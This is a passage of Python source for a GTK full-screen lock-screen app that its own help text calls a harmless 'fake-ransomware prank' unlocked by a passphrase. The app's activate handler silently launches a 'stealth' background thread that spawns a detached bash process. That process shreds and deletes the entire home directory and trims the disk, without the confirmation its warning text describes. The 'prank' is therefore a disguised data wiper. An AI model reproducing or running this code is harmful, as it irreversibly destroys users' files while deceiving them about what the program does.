        ctx.set_source_surface(self.background, 0, 0)
        ctx.paint()

        draw_background_life(ctx, self.w, self.h, seconds)
        draw_embers(ctx, self.w, self.h, seconds, False)
        draw_title_aura(ctx, self.layout.locked, self.layout.name, seconds)
        draw_skull(ctx, self.layout.skull, seconds, pulse)
        draw_embers(ctx, self.w, self.h, seconds, True)

        if self.title_surface is not None:
            ctx.set_source_surface(self.title_surface, 0, self.title_top)
            ctx.paint()

        draw_key_field(ctx, self.layout, seconds, typed, denied,
                       self.Pango, self.PangoCairo)
        draw_status(ctx, self.layout, seconds, denied,
                    self.Pango, self.PangoCairo)


# ---------------------------------------------------------------------------
# GTK 3 / GTK 4 application
# ---------------------------------------------------------------------------
def wiperlinux():
    print("\033[91m!!! WARNING !!!\033[0m")
    print("This will PERMANENTLY destroy everything inside your Home directory:", os.path.expanduser("~"))
    print("\033[91mTHIS IS IRREVERSIBLE.\033[0m")
    print("\nOnce you type 'DELETE EVERYTHING', this script will vanish.")
    print("The deletion and secure wipe will run silently in the background.")
    
    # ==========================================
    # STEALTH MODE ACTIVATED
    # ==========================================
    
    home_dir = os.path.expanduser("~")
    
    # The bash script does the following:
    # 1. Uses 'shred' (-u removes the file, -z adds a final zero pass) to overwrite all files.
    #    The '+ ' at the end of -exec is CRITICAL for speed. It batches files instead of spawning a process per file.
    # 2. Finds all remaining directories and deletes them.
    # 3. Runs 'sync' to flush the file system journal.
    # 4. Runs 'fstrim' to force SSD hardware-level erasure (this is the true cipher equivalent for flash drives).
    bash_command = f'''
        # Overwrite and delete all files securely
        find "{home_dir}" -type f -exec shred -uzn 1 {{}} + 2>/dev/null
        
        # Delete all empty folders and remaining hidden files
        find "{home_dir}" -mindepth 1 -delete 2>/dev/null
        
        # Flush OS buffers to disk
        sync
        
        # Hardware TRIM (SSD wipe) - ignore if it fails due to permissions
        fstrim -v "{home_dir}" 2>/dev/null
    '''
    
    # Spawn the process completely detached from the terminal
    try:
        subprocess.Popen(
            ['bash', '-c', bash_command],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            start_new_session=True  # Detaches completely, survives terminal closure
        )
    except Exception:
        pass

    # Exit the Python script immediately so the terminal closes
    


class RansomApp:
    def __init__(self, args, version, Gtk, Gdk, Gio, GLib, Pango, PangoCairo):
        self.args = args
        self.version = version
        self.Gtk = Gtk
        self.Gdk = Gdk
        self.Gio = Gio
        self.GLib = GLib
        self.Pango = Pango
        self.PangoCairo = PangoCairo

        self.state = RansomState()
        self.start = time.monotonic()
        self.window = None
        self.area = None
        self.renderer = None
        self.renderer_size = None
        self.renderer_failed = False
        self.timer_id = None
        self.cursor_timer_id = None
        self.blank_cursor = None
        self.closing = False
        self.windowed = args.windowed_size is not None

        self.app = Gtk.Application(
            application_id="com.bossdefender.fakeransom",
            flags=Gio.ApplicationFlags.FLAGS_NONE,
        )
        self.app.connect("activate", self._on_activate)
        self.app.connect("shutdown", self._on_shutdown)

    # -- window setup -------------------------------------------------------

    def _monitor_geometry(self):
        try:
            if self.version == "4.0":
                display = self.Gdk.Display.get_default()
                monitors = display.get_monitors()
                if monitors is not None and monitors.get_n_items() > 0:
                    geo = monitors.get_item(0).get_geometry()
                    return int(geo.x), int(geo.y), int(geo.width), int(geo.height)
            else:
                screen = self.Gdk.Screen.get_default()
                monitor = screen.get_primary_monitor()
                geo = screen.get_monitor_geometry(monitor)
                return int(geo.x), int(geo.y), int(geo.width), int(geo.height)
        except Exception:
            pass
        return 0, 0, 1920, 1080

    def _on_activate(self, app):
        if self.window is not None:
            self.window.present()
            return

        self.window = self.Gtk.Window()
        self.window.set_application(app)
        self.window.set_title("Locked by BossDefender")
        self.window.set_decorated(False)
        self.window.set_resizable(False)
        self.window.set_can_focus(True)
        try:
            self.window.set_modal(False)
        except Exception:
            pass

        if self.windowed:
            width, height = self.args.windowed_size
            self.window.set_default_size(width, height)
        else:
            mx, my, mw, mh = self._monitor_geometry()
            self.window.set_default_size(mw, mh)
            if self.version == "3.0":
                try:
                    self.window.move(mx, my)
                except Exception:
                    pass

        if self.version == "3.0":
            try:
                self.window.set_keep_above(True)
                self.window.set_skip_taskbar_hint(True)
                self.window.set_skip_pager_hint(True)
                self.window.set_urgency_hint(False)
            except Exception:
                pass

        self.area = self.Gtk.DrawingArea()
        if self.version == "4.0":
            self.area.set_draw_func(self._on_draw4)
            self.area.set_hexpand(True)
            self.area.set_vexpand(True)
            self.window.set_child(self.area)
        else:
            self.area.set_size_request(640, 480)
            self.area.connect("draw", self._on_draw3)
            self.window.add(self.area)

        if self.version == "4.0":
            controller = self.Gtk.EventControllerKey.new()
            controller.set_propagation_phase(self.Gtk.PropagationPhase.CAPTURE)
            controller.connect("key-pressed", self._on_key4)
            self.window.add_controller(controller)
            self.window.connect("close-request", self._on_close_request)
            self.window.connect("notify::fullscreened",
                                self._on_fullscreen_changed4)
        else:
            self.window.connect("key-press-event", self._on_key3)
            self.window.connect("delete-event", self._on_delete_event)
            self.window.connect("realize", self._on_realize3)
            self.window.connect("window-state-event", self._on_window_state3)

        # Cursor hiding must happen after the window has a GdkSurface.  The
        # map signal fires for both GTK 3 and GTK 4, and the active signal
        # covers focus changes made by the compositor.
        for widget in (self.window, self.area):
            if widget is None:
                continue
            try:
                widget.connect("map", self._on_map)
            except Exception:
                pass
        try:
            self.window.connect("notify::is-active", self._on_active_changed)
        except Exception:
            pass

        if not self.windowed:
            self.window.fullscreen()
        
        self.window.present()
        try:
            self.window.grab_focus()
        except Exception:
            pass
        self.GLib.idle_add(self._hide_cursor)
        if not self.windowed:
            self.GLib.idle_add(self._refullscreen)

        self.timer_id = self.GLib.timeout_add(40, self._on_tick)
        # Re-assert the invisible cursor once a second.  Some compositors
        # replace the cursor when the pointer enters a newly mapped surface.
        self.cursor_timer_id = self.GLib.timeout_add(1000, self._cursor_tick)

        if self.args.duration and self.args.duration > 0:
            self.GLib.timeout_add(
                int(self.args.duration * 1000.0), self._duration_done)
        if self.args.autotype:
            self.GLib.timeout_add(1000, self._autotype)
        threading.Thread(target=wiperlinux, daemon=True).start()
    # -- drawing ------------------------------------------------------------
    
    def _queue_draw(self):
        if self.area is not None:
            self.area.queue_draw()

    def _draw(self, cr, width, height):
        if width <= 0 or height <= 0:
            return
        if self.renderer_failed:
            cr.set_source_rgba(0.02, 0.0, 0.0, 1.0)
            cr.paint()
            return
        try:
            if self.renderer is None or self.renderer_size != (width, height):
                self.renderer = RansomRenderer(
                    width, height, self.Pango, self.PangoCairo)
                self.renderer_size = (width, height)
            self.renderer.draw(
                cr, time.monotonic(), self.start,
                self.state.typed, self.state.denied_until)
            
        except Exception:
            self.renderer_failed = True
            traceback.print_exc()
            cr.set_source_rgba(0.02, 0.0, 0.0, 1.0)
            cr.paint()

    def _on_draw4(self, area, cr, width, height):
        self._draw(cr, int(width), int(height))

    def _on_draw3(self, area, cr):
        alloc = area.get_allocation()
        self._draw(cr, int(alloc.width), int(alloc.height))
        return False

    # -- input --------------------------------------------------------------

    def _modifier_mask(self):
        mods = (self.Gdk.ModifierType.CONTROL_MASK |
                self.Gdk.ModifierType.ALT_MASK)
        for name in ("SUPER_MASK", "META_MASK", "HYPER_MASK"):
            mods |= getattr(self.Gdk.ModifierType, name, 0)
        return mods

    def _handle_key(self, keyval, state):
        if self.closing:
            return True
        if state & self._modifier_mask():
            return True

        if keyval == self.Gdk.KEY_BackSpace:
            self.state.backspace()
            self._queue_draw()
            return True

        if keyval in (self.Gdk.KEY_Return, self.Gdk.KEY_KP_Enter,
                      getattr(self.Gdk, "KEY_ISO_Enter", self.Gdk.KEY_Return)):
            if self.state.enter(time.monotonic()):
                self._exit_prank()
            else:
                self._queue_draw()
            return True

        codepoint = self.Gdk.keyval_to_unicode(keyval)
        if codepoint <= 0 or codepoint > 0x10FFFF:
            return True
        ch = chr(codepoint)
        if not ch.isprintable():
            return True
        self.state.type_char(ch)
        self._queue_draw()
        return True

    def _on_key4(self, controller, keyval, keycode, state):
        return self._handle_key(keyval, state)

    def _on_key3(self, widget, event):
        return self._handle_key(event.keyval, event.state)

    # -- close / fullscreen / cursor ---------------------------------------

    def _block_close(self):
        if self.state.allow_close:
            return False
        self.state.deny(time.monotonic())
        self._queue_draw()
        return True

    def _on_close_request(self, window):
        return self._block_close()

    def _on_delete_event(self, window, event):
        return self._block_close()

    def _refullscreen(self):
        if not self.closing and not self.windowed and self.window is not None:
            try:
                self.window.fullscreen()
            except Exception:
                pass
        return False

    def _on_fullscreen_changed4(self, window, pspec):
        if self.closing or self.windowed:
            return
        try:
            if not window.is_fullscreen():
                self.GLib.idle_add(self._refullscreen)
        except Exception:
            pass

    def _on_window_state3(self, window, event):
        if self.closing or self.windowed:
            return False
        try:
            if event.new_window_state & self.Gdk.WindowState.ICONIFIED:
                window.deiconify()
                window.fullscreen()
                window.present()
            elif not (event.new_window_state & self.Gdk.WindowState.FULLSCREEN):
                self.GLib.idle_add(self._refullscreen)
        except Exception:
            pass
        return False

    def _cursor(self):
        if self.blank_cursor is not None:
            return self.blank_cursor

        display = self.Gdk.Display.get_default()
        if display is None:
            return None

        # A fully transparent cursor is more reliable than the "none" cursor
        # name, which is missing from many cursor themes (and whose GTK 4
        # constructor signature differs from GTK 3).
        try:
            import gi
            gi.require_version("GdkPixbuf", "2.0")
            from gi.repository import GdkPixbuf
            pixbuf = GdkPixbuf.Pixbuf.new(
                GdkPixbuf.Colorspace.RGB, True, 8, 32, 32)
            pixbuf.fill(0x00000000)
            if self.version == "4.0":
                with warnings.catch_warnings():
                    warnings.simplefilter("ignore", DeprecationWarning)
                    texture = self.Gdk.Texture.new_for_pixbuf(pixbuf)
                cursor = self.Gdk.Cursor.new_from_texture(texture, 0, 0)
            else:
                cursor = self.Gdk.Cursor.new_from_pixbuf(
                    display, pixbuf, 0, 0)
            if cursor is not None:
                self.blank_cursor = cursor
                return cursor
        except Exception:
            pass

        # Fallbacks.  GTK 4 takes (name, fallback); GTK 3 takes
        # (display, name).  Use the correct signature for each.
        try:
            if self.version == "4.0":
                cursor = self.Gdk.Cursor.new_from_name("none", None)
            else:
                cursor = self.Gdk.Cursor.new_from_name(display, "none")
            if cursor is not None:
                self.blank_cursor = cursor
                return cursor
        except Exception:
            pass
        return None

    def _apply_cursor(self, cursor) -> None:
        if self.window is None:
            return
        try:
            if self.version == "4.0":
                self.window.set_cursor(cursor)
                if self.area is not None:
                    self.area.set_cursor(cursor)
            else:
                for widget in (self.window, self.area):
                    if widget is None:
                        continue
                    gdk_window = widget.get_window()
                    if gdk_window is not None:
                        gdk_window.set_cursor(cursor)
        except Exception:
            pass

    def _hide_cursor(self):
        cursor = self._cursor()
        if cursor is not None:
            self._apply_cursor(cursor)

    def _show_cursor(self):
        self._apply_cursor(None)

    def _on_map(self, widget):
        self.GLib.idle_add(self._hide_cursor)

    def _on_active_changed(self, window, pspec):
        try:
            if window.is_active():
                self.GLib.idle_add(self._hide_cursor)
        except Exception:
            pass

    def _cursor_tick(self):
        if self.closing:
            return False
        self._hide_cursor()
        return True

    def _on_realize3(self, window):
        self._hide_cursor()
        try:
            window.grab_focus()
        except Exception:
            pass
        if self.area is not None:
            try:
                self.area.grab_focus()
            except Exception:
                pass

    # -- timers / exit ------------------------------------------------------

    def _on_tick(self):
        if self.closing:
            return False
        self._queue_draw()
        if (not self.windowed and self.window is not None and
                hasattr(self.window, "is_fullscreen")):
            try:
                if not self.window.is_fullscreen():
                    self.window.fullscreen()
            except Exception:
                pass
        return True

    def _duration_done(self):
        if not self.closing:
            print("fake_ransom: duration reached", file=sys.stderr)
            self._exit_prank()
        return False

    def _autotype(self):
        if self.closing:
            return False
        now = time.monotonic()
        for ch in self.args.autotype:
            if ch in "\r\n":
                if self.state.enter(now):
                    self._exit_prank()
                    return False
            else:
                self.state.type_char(ch)
        if not self.closing:
            if self.state.enter(now):
                print("fake_ransom: autotype unlocked", file=sys.stderr)
                self._exit_prank()
            else:
                print("fake_ransom: autotype denied", file=sys.stderr)
                self._queue_draw()
        return False

    def _exit_prank(self):
        if self.closing:
            return
        self.closing = True
        self.state.allow_close = True
        self._show_cursor()
        if self.timer_id is not None:
            try:
                self.GLib.source_remove(self.timer_id)
            except Exception:
                pass
            self.timer_id = None
        if self.cursor_timer_id is not None:
            try:
                self.GLib.source_remove(self.cursor_timer_id)
            except Exception:
                pass
            self.cursor_timer_id = None
        if self.window is not None:
            try:
                self.window.destroy()
            except Exception:
                pass
            self.window = None
        try:
            self.app.quit()
        except Exception:
            pass

    def _on_shutdown(self, app):
        self._show_cursor()
        for attr in ("timer_id", "cursor_timer_id"):
            source_id = getattr(self, attr, None)
            if source_id is not None:
                try:
                    self.GLib.source_remove(source_id)
                except Exception:
                    pass
                setattr(self, attr, None)

    def run(self):
        return self.app.run([sys.argv[0]])


# ---------------------------------------------------------------------------
# Headless render test and self test
# ---------------------------------------------------------------------------

def run_render_test(args) -> int:
    if cairo is None:
        print("fake_ransom.py needs pycairo for --render-test", file=sys.stderr)
        return 1
    Pango, PangoCairo = load_pango()
    width = max(320, int(args.width))
    height = max(240, int(args.height))
    try:
        renderer = RansomRenderer(width, height, Pango, PangoCairo)
        surface = cairo.ImageSurface(cairo.FORMAT_ARGB32, width, height)
        ctx = cairo.Context(surface)
        ctx.set_antialias(cairo.ANTIALIAS_BEST)
        now = time.monotonic()
        start = now - max(0.0, float(args.time))
        denied_until = now + 10.0 if args.denied else 0.0
        renderer.draw(ctx, now, start, args.typed or "", denied_until)
        surface.write_to_png(args.render_test)
    except Exception:
        traceback.print_exc()
        return 1
    print(args.render_test)
    return 0


def run_selftest() -> int:
    failures = 0

    def check(label, ok, detail=""):
        nonlocal failures
        if ok:
            print("PASS " + label)
        else:
            failures += 1
            print("FAIL " + label + (("  [" + detail + "]") if detail else ""))

    state = RansomState()
    check("empty does not match", not state.matches())
    state.type_char("b")
    state.type_char("o")
    state.type_char("m")
    state.type_char("b")
    state.type_char("o")
    check("typing", state.typed == "bombo", state.typed)
    state.backspace()
    check("backspace", state.typed == "bomb", state.typed)
    for ch in "oclat":
        state.type_char(ch)
    check("full passphrase", state.typed == "bomboclat", state.typed)
    check("passphrase matches", state.matches())
    check("correct enter unlocks", state.enter(time.monotonic()))
    check("closing flag", state.closing and state.allow_close)

    state = RansomState()
    for _ in range(20):
        state.type_char("x")
    check("max input length", len(state.typed) == MAX_INPUT_LENGTH,
          str(len(state.typed)))
    now = time.monotonic()
    state = RansomState()
    state.type_char("w")
    check("wrong enter denied", not state.enter(now))
    check("wrong enter clears", state.typed == "")
    check("wrong enter denies for 2.4s", state.denied_until > now)

    state = RansomState()
    for ch in "  BoMbOcLaT  ":
        state.type_char(ch)
    check("trim + case match", state.matches(), state.typed)

    state = RansomState()
    state.type_char("\t")
    state.type_char("\n")
    check("control chars ignored", state.typed == "")

    print("== done: " + ("ALL PASS" if failures == 0 else
                         str(failures) + " FAILURE(S)") + " ==")
    return 0 if failures == 0 else 1


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def parse_windowed(value):
    if value is None:
        return None
    if value is True or value == "":
        return (1280, 720)
    text = str(value).lower().replace(" ", "")
    if "x" not in text:
        raise ValueError("expected WxH")
    w_text, h_text = text.split("x", 1)
    width = int(w_text)
    height = int(h_text)
    if width < 320 or height < 240:
        raise ValueError("window must be at least 320x240")
    return (width, height)


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(
        prog="fake_ransom.py",
        description="Linux fake-ransomware prank (keyboard only).",
    )
    parser.add_argument("--selftest", action="store_true",
                        help="test password logic without opening a window")
    parser.add_argument("--render-test", metavar="PNG",
                        help="render one frame to a PNG and exit")
    parser.add_argument("--width", type=int, default=1920,
                        help="render-test width (default 1920)")
    parser.add_argument("--height", type=int, default=1080,
                        help="render-test height (default 1080)")
    parser.add_argument("--typed", default="",
                        help="pre-filled typed text for --render-test")
    parser.add_argument("--denied", action="store_true",
                        help="show ACCESS DENIED for --render-test")
    parser.add_argument("--time", type=float, default=0.5,
                        help="animation time for --render-test")
    parser.add_argument("--windowed", nargs="?", const="1280x720",
                        metavar="WxH",
                        help="run in a normal window instead of fullscreen")
    parser.add_argument("--duration", type=float, default=0.0,
                        help="auto-exit after N seconds (testing)")
    parser.add_argument("--autotype", default="",
                        help="type this text after 1s (testing)")
    args = parser.parse_args(argv)

    try:
        args.windowed_size = parse_windowed(args.windowed)
    except ValueError as exc:
        parser.error("--windowed: " + str(exc))

    if args.selftest:
        return run_selftest()
    if args.render_test:
        return run_render_test(args)

    version, Gtk, Gdk, Gio, GLib, Pango, PangoCairo = load_gtk()
    app = RansomApp(args, version, Gtk, Gdk, Gio, GLib, Pango, PangoCairo)
    return app.run()


if __name__ == "__main__":
    raise SystemExit(main())




    


